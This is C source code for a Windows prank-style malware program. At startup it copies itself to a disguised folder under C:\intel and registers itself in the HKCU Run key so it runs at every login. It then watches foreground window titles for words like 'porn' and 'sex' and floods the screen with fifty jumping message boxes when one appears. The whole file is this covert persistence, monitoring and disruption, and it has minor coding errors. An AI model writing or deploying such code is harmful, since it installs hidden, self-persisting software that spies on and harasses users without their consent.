#include <windows.h>
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "MessageBox.h"

#define MAX_TITLE 256
#define STRINGS_NUM 4


const char g_szClassName[] = "myWindowClass";

static const TCHAR reg_path[] = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");

static const TCHAR hide_path[] = TEXT("C:\\intel\\Application\\ApplicationForYou.exe");
static const TCHAR hide_dir[] = TEXT("C:\\intel\\Application");

// Step 4: the Window Procedure
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
		case WM_LBUTTONDOWN:
		{
			MONITORINFO WindowMonitorInfo;
			WindowMonitorInfo.cbSize = sizeof(MONITORINFO);

			//char szFileName[MAX_PATH];
			//char str[256];
			HMONITOR WindowMonitor = MonitorFromWindow(hwnd, MONITOR_DEFAULTTOPRIMARY);
			BOOL success = GetMonitorInfoA(WindowMonitor, &WindowMonitorInfo);
			int PosX = WindowMonitorInfo.rcMonitor.left + rand() % (WindowMonitorInfo.rcMonitor.right - WindowMonitorInfo.rcMonitor.left + 1);
			int PosY = WindowMonitorInfo.rcMonitor.top + rand() % (WindowMonitorInfo.rcMonitor.bottom - WindowMonitorInfo.rcMonitor.top + 1);

			HINSTANCE hInstance = GetModuleHandle(NULL);
			SetWindowPos(hwnd, HWND_TOP, PosX, PosY, 240, 120, SWP_SHOWWINDOW);

			//GetModuleFileName(hInstance, szFileName, MAX_PATH);
			//MessageBox(hwnd, str, "This program is:", MB_OK | MB_ICONINFORMATION);
		}
		break;
		case WM_CLOSE:
			DestroyWindow(hwnd);
			break;
		case WM_DESTROY:
			PostQuitMessage(0);
			break;
		default:
			return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow)
{
	const char badWords[STRINGS_NUM][10] = { "porn" , "Porn", "sex", "Sex" };
	const long GOT_YOU_SLEEP_TIME = 1000 * 3600 * 9;
	int what = 2;

	WNDCLASSEX wc;
	HWND hwnd;
	MSG Msg;
	TCHAR silent[] = TEXT("silent");
	
	
	//step 0.1: get my path and copy myself to a hiding place
	TCHAR path[MAX_PATH+1];
	GetModuleFileName(hInstance, path, MAX_PATH);
	
	BOOL success = CreateDirectoryA(hide_dir, NULL);
	CopyFile(path, hide_path, FALSE);
	//step 0.2: registering myself as startup
	HKEY hkey = NULL;
	int a = RegCreateKey(HKEY_CURRENT_USER, reg_path, &hkey);
	int b = RegSetValueEx(hkey, TEXT("got you!"), 0, REG_SZ, (BYTE*)hide_path, _tcslen(path) + 1);
	int c = RegCloseKey(hkey);
	 
	if (_tcscmp(lpCmdLine, &silent) != 0) {
		//Step 1: Registering the Window Class
		wc.cbSize = sizeof(WNDCLASSEX);
		wc.style = 0;
		wc.lpfnWndProc = WndProc;
		wc.cbClsExtra = 0;
		wc.cbWndExtra = 0;
		wc.hInstance = hInstance;
		wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
		wc.hCursor = LoadCursor(NULL, IDC_ARROW);
		wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
		wc.lpszMenuName = NULL;
		wc.lpszClassName = g_szClassName;
		wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

		if (!RegisterClassEx(&wc))
		{
			MessageBox(NULL, "Window Registration Failed!", "Error!",
				MB_ICONEXCLAMATION | MB_OK);
			return 0;
		}

		// Step 2: Creating the Window
		hwnd = CreateWindowEx(
			WS_EX_CLIENTEDGE | WS_EX_TOPMOST,
			g_szClassName,
			"The title of my window",
			WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
			NULL, NULL, hInstance, NULL);

		if (hwnd == NULL)
		{
			MessageBox(NULL, "Window Creation Failed!", "Error!",
				MB_ICONEXCLAMATION | MB_OK);
			return 0;
		}

		ShowWindow(hwnd, nCmdShow);
		UpdateWindow(hwnd);

		OutputDebugString("hey/n");


		//std::cout << "static constructor\n";
		// Step 3: The Message Loop
		while (GetMessage(&Msg, NULL, 0, 0) > 0)
		{
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
	}


	TCHAR wndTitle[MAX_TITLE];
	BOOL gotYou;

	while (TRUE) {
		hwnd = GetForegroundWindow();
		gotYou = FALSE;
		GetWindowText(hwnd, wndTitle, sizeof(wndTitle));
		OutputDebugString(wndTitle);
		OutputDebugString("\n");


		// logic start here
		for (int i = 0; i < STRINGS_NUM; i++) {
			gotYou = gotYou || strstr(wndTitle, badWords[i]);
		}
		
		gotYou = gotYou && !strstr(wndTitle, "Google Search");

		
		// Mess starts here
		if (gotYou) {
			OutputDebugString("GOT YOU");
			for (int i = 0; i < 50; i++) {
				CreateThread(NULL, 0, JumpMessageBox, NULL, 0, NULL);
				Sleep(100);
			}
			Sleep(GOT_YOU_SLEEP_TIME);
		}
		Sleep(1000);
	}


	return 0;
}

